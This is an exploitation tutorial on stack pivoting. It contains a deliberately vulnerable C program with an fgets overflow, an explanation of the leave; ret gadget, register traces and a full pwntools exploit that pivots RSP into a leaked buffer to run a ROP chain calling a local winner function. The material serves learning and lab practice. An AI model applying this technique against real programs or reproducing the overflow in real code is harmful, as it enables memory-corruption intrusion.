
#metadata(
  (
    title: "Stack Pivoting to ROP",
    description: "Exploiting a stack buffer overflow to pivot the stack pointer to a controlled area and execute a ROP chain.",
    date: "2025-12-29",
    order: 30,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Stack Pivoting

== Introduction

Stack Pivoting is a technique used when an attacker has control over the instruction pointer (RIP) and the stack pointer (RSP), but limited space on the stack for a full Return-Oriented Programming (ROP) chain. By modifying the RSP to point to a different memory location (often the heap or a controlled buffer in the `.bss` or data section), the attacker can execute a longer ROP chain stored there.

This document demonstrates stack pivoting using a `leave; ret` gadget to shift the stack execution to a buffer we control.

== Prerequisites
- *Buffer Overflow*: A vulnerability allowing control of the saved base pointer (RBP) and return address (RIP).
- *Known Address*: A leaked or known address of a controlled buffer (e.g., the stack buffer itself or a heap chunk).
- *Gadgets*: Availability of a `leave; ret` gadget and necessary ROP gadgets (`pop rdi`, etc.).

== The Source
```c
// gcc source.c -o vuln -no-pie -fno-stack-protector
#include <stdio.h>

void gadgets() {
    __asm__("pop %rdi; ret");
    __asm__("pop %rsi; pop %r15; ret");
}

void winner(int a, int b) {
    if(a == 0xdeadbeef && b == 0xdeadc0de) {
        puts("Great job!");
        return;
    }
    puts("Whelp, almost...?");
}

void vuln() {
    char buffer[0x60];
    printf("Try pivoting to: %p\n", buffer);
    fgets(buffer, 0x80, stdin);
}

int main() {
    vuln();
    return 0;
}
```

== The Vulnerability

The vulnerable code (`source.c`) contains a buffer overflow in the `vuln` function.

```c
void vuln() {
    char buffer[0x60];
    printf("Try pivoting to: %p\n", buffer); // Leak buffer address
    fgets(buffer, 0x80, stdin);              // Overflow: 0x80 > 0x60
}
```

The `fgets` function reads `0x80` bytes into a `0x60`-byte buffer. This allows us to overwrite the saved RBP and the return address. However, we only have `0x20` bytes (32 bytes) of overflow space, which might be tight for a complex chain. More importantly, we can pivot the stack back to the *beginning* of our buffer (`buffer[0]`) to use the full `0x80` bytes for our ROP chain.

== The `leave; ret` Gadget

The core of this technique is the `leave; ret` sequence, which is the standard function epilogue.

1. *`leave`* is equivalent to:
  ```assembly
  mov rsp, rbp
  pop rbp
  ```
  It sets the stack pointer (`rsp`) to the current base pointer (`rbp`), then pops the top value of the stack into `rbp`.

2. *`ret`* is equivalent to:
  ```assembly
  pop rip
  jmp rip
  ```
  It pops the next value from the stack into the instruction pointer (`rip`) and jumps to it.

By controlling the saved RBP on the stack, we can control where `rsp` points after the `leave` instruction.

== Attack Flow Explained

=== 1. Leak the Target Address

The program conveniently prints the address of `buffer`. We parse this in our exploit script.

```python
p.recvuntil(b"to: ")
buffer = int(p.recvline(), 16)
```

=== 2. Construct the ROP Chain

We build our ROP chain at the *beginning* of the payload. This chain will call `winner(0xdeadbeef, 0xdeadc0de)`.

```python
# Gadgets
pop_rdi = 0x40122b
pop_rsi_r15 = 0x401229
winner = elf.symbols['winner']

# ROP Chain (placed at start of buffer)
payload = b"A" * 8           # Junk (consumed by the 'pop rbp' of the pivot)
payload += pwn.p64(pop_rdi)
payload += pwn.p64(0xdeadbeef)
payload += pwn.p64(pop_rsi_r15)
payload += pwn.p64(0xdeadc0de)
payload += pwn.p64(0x0)      # padding for r15
payload += pwn.p64(winner)
```

#figure(
  table(
    columns: (auto, auto),
    inset: 10pt,
    align: center,
    [*Offset*], [*Content*],
    [`0x00`], [`"AAAAAAAA"` (Junk)],
    [`0x08`], [`pop rdi; ret`],
    [`0x10`], [`0xdeadbeef`],
    [`0x18`], [`pop rsi; pop r15; ret`],
    [`...`], [`...`],
  ),
  caption: [The ROP chain is placed at the very start of the buffer.],
)

=== 3. The Pivot Payload

We pad the payload to reach the saved RBP. We overwrite the saved RBP with our target buffer address (the "pivot target") and the return address with the address of a `leave; ret` gadget.

```python
# Padding to reach saved RBP
payload += b"B" * (0x60 - len(payload))

# 1. Overwrite Saved RBP with target buffer address
payload += pwn.p64(buffer)

# 2. Overwrite Return Address with `leave; ret` gadget
leave_ret = 0x4011b7
payload += pwn.p64(leave_ret)
```

=== 4. Execution Trace

When `vuln` returns, it executes its own `leave; ret` (let's call it *Epilogue 1*).

1. *Epilogue 1 - `leave`*:
  - `mov rsp, rbp`: RSP moves to the old frame base.
  - `pop rbp`: RBP is popped. Since we overwrote this on the stack, RBP now holds `buffer` (our target address).
2. *Epilogue 1 - `ret`*:
  - `pop rip`: RIP is popped. Since we overwrote this, RIP now holds the address of our `leave; ret` gadget (*Epilogue 2*).

Now, the CPU executes the *Epilogue 2* (`leave; ret`) gadget we jumped to:

3. *Epilogue 2 - `leave`*:
  - `mov rsp, rbp`: RSP is set to RBP. Since RBP is `buffer`, *RSP now points to the start of our buffer*. *Stack Pivot Complete!*
  - `pop rbp`: The top value of our buffer (`"AAAAAAAA"`) is popped into RBP. This is why we needed the 8 bytes of junk at the start.
4. *Epilogue 2 - `ret`*:
  - `pop rip`: The next value on the stack (our buffer) is popped into RIP. This is the first gadget of our ROP chain (`pop rdi`).

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Step*], [*Register*], [*Value*],
    [Initial], [`RBP`], [Stack Frame Base],
    [After Overwrite], [`Saved RBP`], [`buffer` address],
    [After `vuln` `leave`], [`RBP`], [`buffer` address],
    [After Gadget `leave`], [`RSP`], [`buffer` + 8 (after pop)],
    [After Gadget `ret`], [`RIP`], [`pop rdi` gadget],
  ),
  caption: [Register state changes during the stack pivot.],
)

The processor now executes our ROP chain located at the start of the buffer, cleanly passing arguments and calling `winner`.

=== 5. Complete Exploit Script
```python
import pwn

elf = pwn.context.binary = pwn.ELF("./vuln")

p = pwn.process(elf.path)
p.recvuntil(b"to: ")
buffer = int(p.recvline(), 16)
pwn.log.info(f"Leaked buffer address: {hex(buffer)}")

# Gadgets
pop_rdi = ...
pop_rsi_r15 = ...
leave_ret = ...
winner = elf.symbols['winner']

# ROP Chain
payload = b"A" * 8  # Junk for pop rbp
payload += pwn.p64(pop_rdi)
payload += pwn.p64(0xdeadbeef)
payload += pwn.p64(pop_rsi_r15)
payload += pwn.p64(0xdeadc0de)
payload += pwn.p64(0x0)  # junk for r15
payload += pwn.p64(winner)

# Padding to reach saved RBP (buffer size is 0x60 = 96)
payload += b"B" * (0x60 - len(payload))

# Overwrite Saved RBP with buffer address (Stack Pivot target)
payload += pwn.p64(buffer)

# Overwrite Return Address with leave; ret gadget
payload += pwn.p64(leave_ret)

p.sendline(payload)
p.interactive()
```
